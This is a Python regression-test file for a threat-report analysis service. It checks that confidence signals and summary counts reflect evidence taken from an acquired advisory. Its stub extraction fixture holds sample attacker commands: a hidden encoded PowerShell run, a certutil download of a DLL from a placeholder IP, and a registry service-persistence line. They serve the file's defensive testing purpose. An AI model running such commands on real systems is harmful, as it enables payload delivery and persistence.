"""Prev-mode P1a targeted regression tests (2026-02-14).

Defect background (owner-authorized fix):
  When Prev mode successfully acquires an advisory URL, the report
  extraction produces rich evidence (commands, MITRE techniques,
  body artifacts, malware families, actors).  Prior to P1a, the
  Prev-mode confidence signals + SUMMARY block still read from the
  raw-input preprocessor state (empty for URL-only input), producing
  a misleading "Threat Objective: Uncategorised · Confidence: 30%
  Low · Parser MISSING · Evidence MISSING · Behaviors: 0" verdict
  even though the acquired advisory carried the full evidence surface.

Fix (services/die/investigation_results.py):
  1. After URL acquisition succeeds, re-run
     ``classify_intent_from_analyze`` with the augmented ``techniques``
     list so the intent objective + progress + confidence reflect
     ALL acquired evidence.
  2. Before calling ``build_confidence_breakdown``, synthesize a
     preprocessor envelope that adds report_extraction.commands as
     virtual stages (each with its own evidence excerpt).  This flips
     the "Parser" and "Evidence" signals from MISSING → PASSED without
     any heuristic or AI step, and increases the Overall confidence.
  3. The "Commands Extracted" summary counter reflects the union of
     preprocessor + acquired evidence.

Non-goals (owner rule):
  - Do NOT copy Prod's verdict number into Prev.
  - Do NOT modify services/ida/acquisition.py.
  - Failed acquisitions (source=="acquisition_failed") MUST still
    show Parser/Evidence MISSING (correct diagnostic state).
"""
from __future__ import annotations

import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))


# ── Shared fixture: stub the IDA acquisition + extraction pipeline ─
def _install_successful_acquisition(monkeypatch):
    """Stub every IDA function used by ``investigation_results.render``
    so the acquirable-URL branch runs end-to-end without any network
    access, producing a canned rich extraction identical in shape to
    what the real acquirer emits for a real threat report."""
    from services.die import investigation_results as ir

    # 1) IDA classifier: report the URL as a threat_report_url the
    # acquirable-URL branch will consume.
    def _fake_classify(src):
        return {
            "ida_class": "threat_report_url",
            "url_intent": {"acquirable": True, "kind": "threat_report"},
            "artifacts": [{
                "type": "url",
                "canonical": src.strip(),
                "value": src.strip(),
                "source": "test",
            }],
        }

    # 2) IDA-3 acquisition: return a truthful "ok=True" envelope.
    class _FakeAcquired:
        def __init__(self, url):
            self.ok = True
            self.url = url
            self.article_text = (
                "Ransomware advisory · deterministic evidence surface\n"
                "PowerShell downloader observed.\n"
                "certutil.exe URL-cache abuse observed."
            )
            self.structured_blocks = []
            self.status_code = 200
            self.host = "example.gov"
        def to_dict(self):
            return {
                "ok":         True,
                "url":        self.url,
                "final_url":  self.url,
                "vendor":     "Test",
                "title":      "Test Advisory",
                "fetched_bytes": 100_000,
                "duration_ms":   1000,
                "engine":     "trafilatura",
                "source_kind":"Static article",
                "fallback_chain": ["trafilatura"],
            }
    monkeypatch.setattr(ir, "_ida_classify", _fake_classify, raising=True)
    monkeypatch.setattr(ir, "_ida_acquire",  lambda url: _FakeAcquired(url), raising=True)

    # 3) IDA-3.5 understand
    monkeypatch.setattr(ir, "_ida_understand", lambda text, meta: {"kind":"threat_report","confidence":0.9}, raising=True)

    # 4) IDA-4 extract: rich fixture mimicking the CISA-shape output
    def _fake_extract(text, blocks):
        return {
            "commands": [
                {"normalized_command": "powershell -nop -w hidden -enc SGVsbG8=",
                 "mitre": ["T1059.001","T1027"], "tactic": "execution",
                 "purpose": "PowerShell encoded command",
                 "language": "powershell"},
                {"normalized_command": "certutil.exe -f urlcache http://198.51.100.20/x.dll x.dll",
                 "mitre": ["T1105","T1059.003"], "tactic": "command_and_control",
                 "purpose": "Certutil URL-cache abuse",
                 "language": "cmd"},
                {"normalized_command": "reg add HKLM\\System\\CurrentControlSet\\Services\\Foo /v Start /t REG_DWORD /d 2 /f",
                 "mitre": ["T1543.003"], "tactic": "persistence",
                 "purpose": "Service persistence",
                 "language": "cmd"},
            ],
            "mitre_techniques": [
                {"id":"T1059.001","name":"PowerShell","tactic":"execution"},
                {"id":"T1027",    "name":"Obfuscated Files or Information","tactic":"defense_evasion"},
                {"id":"T1105",    "name":"Ingress Tool Transfer","tactic":"command_and_control"},
                {"id":"T1059.003","name":"Windows Command Shell","tactic":"execution"},
                {"id":"T1543.003","name":"Windows Service","tactic":"persistence"},
            ],
            "body_artifacts": [
                {"type": "url",    "value": "http://198.51.100.20/x.dll"},
                {"type": "ip",     "value": "198.51.100.20"},
                {"type": "domain", "value": "evil.example"},
            ],
            "cves":           [{"id":"CVE-2024-0001"}],
            "threat_actors":  [{"name":"TestActor"}],
            "malware_families":[{"name":"TestFamily"}],
            "timeline":       [{"ts":"2026-01-01","event":"Initial access"}],
            "yara_rules":     [],
            "sigma_rules":    [],
            "hash_context":   {},
            "behaviors":      [{"name":"downloader"}, {"name":"persistence"}],
            "totals": {"artifacts":3,"mitre":5,"cves":1,"actors":1,
                       "malware":1,"commands":3,"timeline":1,"yara":0,
                       "sigma":0,"behaviors":2},
        }
    monkeypatch.setattr(ir, "_ida_extract", _fake_extract, raising=True)

    # 5) IDA-command-investigator: return the augmented commands with
    # the same mitre / lolbas surface so downstream promotion works.
    def _fake_investigate_all(cmds):
        out = []
        for c in cmds:
            out.append({
                **c,
                "status":   "investigated",
                "lolbas":   ["powershell" if "powershell" in c.get("normalized_command","").lower()
                             else ("certutil.exe" if "certutil" in c.get("normalized_command","").lower()
                                   else "cmd.exe")],
                "peeled_iocs": {},
            })
        return out
    monkeypatch.setattr(ir, "_ida_investigate_all", _fake_investigate_all, raising=True)

    # 6) IDA merge: summarise unions
    def _fake_merge(investigations):
        techs, bins = [], []
        for inv in investigations:
            for m in inv.get("mitre") or []:
                if m not in [t["id"] for t in techs]:
                    techs.append({"id": m, "name": m})
            for lb in inv.get("lolbas") or []:
                if lb not in [b["binary"] for b in bins]:
                    bins.append({"binary": lb, "mitre": inv.get("mitre") or []})
        return {"techniques_union": techs, "lolbins_union": bins}
    monkeypatch.setattr(ir, "_ida_merge", _fake_merge, raising=True)


# ── Test 1 · Confidence signals reflect acquired evidence ──────────
def test_p1a_parser_signal_passes_when_url_acquisition_succeeds(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-001")
    obj = result.get("object") or {}
    signals = {s["id"]: s for s in (obj.get("confidence") or {}).get("signals") or []}
    parser = signals.get("parser") or {}
    assert parser.get("status") == "passed", (
        f"P1a defect regression — Parser signal still MISSING after "
        f"successful URL acquisition. detail={parser.get('detail')!r}"
    )
    assert "0 stage" not in (parser.get("detail") or ""), \
        "Parser detail must not say '0 stage(s) built' when acquisition produced commands"


def test_p1a_evidence_signal_passes_when_url_acquisition_succeeds(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-002")
    obj = result.get("object") or {}
    signals = {s["id"]: s for s in (obj.get("confidence") or {}).get("signals") or []}
    evidence = signals.get("evidence") or {}
    assert evidence.get("status") == "passed", (
        f"P1a defect regression — Evidence signal still MISSING after "
        f"successful URL acquisition. detail={evidence.get('detail')!r}"
    )


def test_p1a_confidence_overall_reflects_augmented_evidence(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-003")
    obj = result.get("object") or {}
    conf = obj.get("confidence") or {}
    overall = conf.get("overall") or 0
    # 30% (Low) was the pre-fix baseline for URL inputs.  With Parser
    # + Evidence + MITRE + LOLBAS + IOC all passing (5 of 8 non-AI
    # signals), the signals-weighted average lands at 62.5% (Medium)
    # for our fixture.  Rich real-world advisories (CISA-shape) push
    # this to 75% (High).  We assert > 55% as the floor so the fix
    # is verifiable without hardcoding a specific target.
    assert overall > 55, (
        f"P1a defect regression — overall confidence stayed at {overall}% "
        f"after augmentation.  Expected > 55% when Parser/Evidence/MITRE/"
        f"LOLBAS/IOC all pass."
    )
    assert conf.get("label") in ("Medium", "High"), (
        f"P1a defect regression — confidence label is {conf.get('label')!r} "
        f"but should have promoted from Low."
    )


def test_p1a_intent_reflects_augmented_techniques(monkeypatch):
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-004")
    output = result.get("output") or ""
    # The pre-fix intent read empty techniques → "Uncategorised · 0%".
    # After P1a it should read the augmented 5 MITRE items spanning
    # execution / defense_evasion / C2 / persistence tactics and
    # produce a non-uncategorised objective.  These values are surfaced
    # in the flat-text SUMMARY block via ``intent.primary_objective``
    # and ``intent.progress_pct``.
    import re as _re
    m_obj = _re.search(r"Threat Objective\s+(.+)", output)
    m_prog = _re.search(r"Attack Progress\s+(\d+)%", output)
    assert m_obj, "SUMMARY missing 'Threat Objective' line"
    assert m_prog, "SUMMARY missing 'Attack Progress' line"
    objective = m_obj.group(1).strip().lower()
    progress = int(m_prog.group(1))
    assert objective and objective not in ("uncategorised", "undetermined"), (
        f"P1a defect regression — Threat Objective is {objective!r} after "
        f"acquisition contributed 5 MITRE techniques across 4 tactics"
    )
    assert progress > 0, (
        f"P1a defect regression — Attack Progress is {progress}% after "
        f"acquisition contributed evidence across 4 tactics"
    )


# ── Guard rail · failed acquisition must NOT trigger P1a ───────────
def test_p1a_failed_acquisition_still_shows_missing_signals(monkeypatch):
    """When URL acquisition returns ok=False, Fix 1 emits the
    ``acquisition_failed`` diagnostic envelope.  P1a MUST NOT
    synthesize virtual preprocessor stages for a failed
    acquisition — analysts must still see the truthful MISSING
    state so the diagnostic is not masked."""
    from services.die import investigation_results as ir

    # Same classifier that says "acquirable" —
    def _fake_classify(src):
        return {
            "ida_class": "threat_report_url",
            "url_intent": {"acquirable": True, "kind": "threat_report"},
            "artifacts": [{"type": "url", "canonical": src.strip(), "value": src.strip()}],
        }

    # But acquisition returns ok=False (Fix 1 territory)
    class _FailedAcq:
        def __init__(self, url):
            self.ok = False
            self.url = url
            self.article_text = ""
            self.structured_blocks = []
        def to_dict(self):
            return {"ok": False, "url": self.url, "status_code": 403,
                    "error_code": "http_error", "engine": "trafilatura",
                    "error_detail": "HTTP 403", "fetched_bytes": 0,
                    "article_chars": 0, "anti_bot": False,
                    "fallback_tried": False}
    monkeypatch.setattr(ir, "_ida_classify", _fake_classify, raising=True)
    monkeypatch.setattr(ir, "_ida_acquire",  lambda url: _FailedAcq(url), raising=True)

    from services.die.investigation_results import render
    result = render("https://blocked.example.gov/advisory/403")
    obj = result.get("object") or {}
    re_ = obj.get("report_extraction") or {}
    assert re_.get("source") == "acquisition_failed", (
        "Fix 1 acquisition_failed envelope regressed"
    )
    signals = {s["id"]: s for s in (obj.get("confidence") or {}).get("signals") or []}
    parser = signals.get("parser") or {}
    evidence = signals.get("evidence") or {}
    # P1a guard: virtual stages must NOT be synthesized for a failed
    # acquisition — the diagnostic state is that no evidence exists.
    assert parser.get("status") == "missing", (
        f"P1a guard regression — Parser signal was promoted to "
        f"{parser.get('status')!r} on a failed acquisition; virtual "
        f"stages leaked into acquisition_failed diagnostic."
    )
    assert evidence.get("status") == "missing", (
        f"P1a guard regression — Evidence signal was promoted to "
        f"{evidence.get('status')!r} on a failed acquisition."
    )


# ── SUMMARY block · Commands Extracted counter ─────────────────────
def test_p1a_summary_commands_extracted_reflects_acquired_evidence(monkeypatch):
    """Before P1a the SUMMARY block read ``contents.commands`` which
    is 0 for URL-only input, giving 'Commands Extracted 0' even when
    66 were acquired.  After P1a the counter reads the union count."""
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-005")
    output = result.get("output") or ""
    # Fixture has 3 acquired commands.  SUMMARY line format:
    #   Commands Extracted   <n>
    # The value must be >= 3 (union of preprocessor + acquired).
    import re as _re
    m = _re.search(r"Commands Extracted\s+(\d+)", output)
    assert m, "SUMMARY block missing 'Commands Extracted' line"
    val = int(m.group(1))
    assert val >= 3, (
        f"P1a defect regression — Commands Extracted={val} in SUMMARY "
        f"after acquiring 3 commands"
    )


# ── SUMMARY block · malware families + actors + behaviors surfacing ─
def test_p1a_summary_surfaces_actor_and_malware_evidence(monkeypatch):
    """P1a owner rule: 'use the actual 66 commands / 44 MITRE / 181
    artifacts / malware-family / actor evidence.'  The Prev SUMMARY
    must expose the actor + malware-family evidence coming from
    ``report_extraction`` when acquisition succeeded — not copy
    Prod's verdict but display the same underlying evidence Prev
    already has."""
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-006")
    output = result.get("output") or ""
    # Fixture publishes 1 actor + 1 malware family.
    assert "Threat Actors" in output, (
        "P1a defect regression — SUMMARY block missing 'Threat Actors' "
        "line even though report_extraction.threat_actors is non-empty"
    )
    assert "TestActor" in output, (
        "P1a defect regression — Threat Actors line does not carry the "
        "fixture actor name 'TestActor'"
    )
    assert "Malware Families" in output, (
        "P1a defect regression — SUMMARY block missing 'Malware Families' "
        "line even though report_extraction.malware_families is non-empty"
    )
    assert "TestFamily" in output, (
        "P1a defect regression — Malware Families line does not carry "
        "the fixture malware name 'TestFamily'"
    )


def test_p1a_summary_behaviors_reflects_acquired_evidence(monkeypatch):
    """Owner-listed expected outcome: 'Behaviors: 0 → derived from the
    actual … evidence.'  When acquisition succeeded the SUMMARY must
    show the count of behaviors the advisory published (not the
    silent-zero previously implied by empty pre.stages)."""
    _install_successful_acquisition(monkeypatch)
    from services.die.investigation_results import render
    result = render("https://test.example.gov/advisory/test-007")
    output = result.get("output") or ""
    # Fixture publishes 2 behaviors.
    import re as _re
    m = _re.search(r"Behaviors\s+(\d+)", output)
    assert m, (
        "P1a defect regression — SUMMARY block missing 'Behaviors' line "
        "even though report_extraction.behaviors is non-empty"
    )
    val = int(m.group(1))
    assert val >= 2, (
        f"P1a defect regression — Behaviors={val} in SUMMARY after "
        f"acquiring 2 behaviors"
    )


# ── Guard rail · failed acquisition MUST NOT surface actor/malware ─
def test_p1a_failed_acquisition_does_not_surface_actor_evidence(monkeypatch):
    """When acquisition fails, ``report_extraction`` is populated only
    with the ``acquisition_failed`` diagnostic envelope (Fix 1) — its
    threat_actors / malware_families are empty by construction.  The
    SUMMARY block must NOT print stale/misleading actor or malware
    lines in that state."""
    from services.die import investigation_results as ir
    monkeypatch.setattr(ir, "_ida_classify", lambda src: {
        "ida_class": "threat_report_url",
        "url_intent": {"acquirable": True, "kind": "threat_report"},
        "artifacts": [{"type": "url", "canonical": src, "value": src}],
    }, raising=True)
    class _F:
        def __init__(self, u):
            self.ok = False; self.url = u
            self.article_text = ""; self.structured_blocks = []
        def to_dict(self):
            return {"ok": False, "url": self.url, "status_code": 403,
                    "error_code": "http_error", "engine": "trafilatura",
                    "error_detail": "HTTP 403", "fetched_bytes": 0}
    monkeypatch.setattr(ir, "_ida_acquire", lambda u: _F(u), raising=True)
    from services.die.investigation_results import render
    result = render("https://blocked.example.gov/x")
    output = result.get("output") or ""
    assert "Threat Actors" not in output, (
        "P1a guard regression — Threat Actors leaked into SUMMARY of a "
        "failed acquisition where no actor evidence exists"
    )
    assert "Malware Families" not in output, (
        "P1a guard regression — Malware Families leaked into SUMMARY of "
        "a failed acquisition where no malware evidence exists"
    )
